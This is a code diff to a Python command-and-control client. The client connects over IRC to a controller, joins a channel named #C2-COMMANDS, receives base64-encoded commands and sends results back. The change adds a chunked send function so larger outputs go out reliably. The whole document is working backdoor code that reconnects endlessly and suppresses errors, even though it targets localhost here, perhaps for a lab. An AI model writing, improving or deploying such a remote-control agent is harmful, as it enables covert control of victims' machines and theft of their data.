@@ -57,11 +57,19 @@ from contextlib import suppress
 from subprocess import run, PIPE
 from base64 import b64decode, b64encode
 
+def sendall(data):
+    chunk = data[:30000]
+    data = data[30000:]
+    while chunk:
+        s.sendall(chunk)
+        chunk = data[:30000]
+        data = data[30000:]
+
 while True:
     with suppress(Exception):
         s = socket()
         s.connect(("127.0.0.1", 1337))
-        s.send(
+        sendall(
             b"USER "
             + getuser().encode()
             + b" "
@@ -71,17 +79,17 @@ while True:
             + b"\r\n"
         )
         s.recv(65535)
-        s.send(b"NICK " + getuser().encode() + b"\r\n")
+        sendall(b"NICK " + getuser().encode() + b"\r\n")
         s.recv(65535)
-        s.send(b"JOIN #C2-COMMANDS" + b"\r\n")
+        sendall(b"JOIN #C2-COMMANDS" + b"\r\n")
         ping = s.recv(65535)
         while not ping.startswith(b"PING :"):
             ping = s.recv(65535)
-        s.send(b"PONG :" + ping[6:])
+        sendall(b"PONG :" + ping[6:])
         s.recv(65535)
         data = b" "
         while True:
-            s.send(b"PRIVMSG #C2-COMMANDS :" + b64encode(data) + b"\r\n")
+            sendall(b"PRIVMSG #C2-COMMANDS :" + b64encode(data) + b"\r\n")
             command = b64decode(
                 s.recv(65535).split(maxsplit=3)[3][1:]
             ).decode()
